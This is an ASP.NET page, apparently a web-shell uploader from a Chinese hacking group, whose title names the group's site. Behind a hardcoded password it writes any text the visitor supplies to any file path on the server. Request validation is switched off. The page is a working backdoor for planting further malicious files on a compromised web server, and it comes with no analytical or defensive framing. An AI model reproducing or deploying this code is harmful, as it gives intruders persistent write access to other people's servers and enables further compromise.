<%@ Page Language="C#" AutoEventWireup="true" validateRequest="false"%>
<html>
<head runat="server">
    <title>08小组内部交流专用  www.huc08.com</title>
    <style type="text/css">
    .btn{
    background-color:transparent;
    color:#00FF00;
    border:1px solid #00FF00;
    font-size:12px;
    font-weight:bold;
    }
    </style>
    <script language="c#" runat="server">
    void Page_Load(object sender, EventArgs e)
    {
            this.lblthispath.Text = Server.MapPath(Request.ServerVariables["PATH_INFO"]);
    }
    void btnUpload_Click(object sender, EventArgs e)
    {
        string password = "TNTHK";
        if (password.Equals(this.txtPass.Text))
        {
            System.IO.StreamWriter sw = new System.IO.StreamWriter(this.txtPath.Text,true,System.Text.Encoding.GetEncoding("gb2312"));
            sw.Write(this.txtContext.Text);
            sw.Flush();
            sw.Close();
            Response.Write("上传成功！");
        }
        else
        {
            Response.Write("擦！哥的马子你也敢泡！"); 
        } 
    }
    </script>
</head>
<body style="font-size:12px;font-weight:bold;color:#00FF00;font-family:Arial, Helvetica, sans-serif;background-color:#000000;">
    <form id="form1" runat="server">
    <div>
    本文件路径:<asp:Label runat="server" ID="lblthispath" Text=""></asp:Label>
    <br />
    <br />
    上传的口令:<asp:TextBox runat="server" ID="txtPass" Width="400px"></asp:TextBox>
    <br />
    <br />
    上传的路径:<asp:TextBox runat="server" ID="txtPath" Width="400px" ></asp:TextBox>
    <br />
    <br />
    上传的内容:<asp:TextBox runat="server" ID="txtContext" Width="400px" Height="250px" TextMode="MultiLine"></asp:TextBox>
    <br />
    <br />
    <br />
    <asp:Button runat="server" ID="btnUpload" text="上传" CssClass="btn" OnClick="btnUpload_Click"/>
    </div>
    </form>
</body>
</html>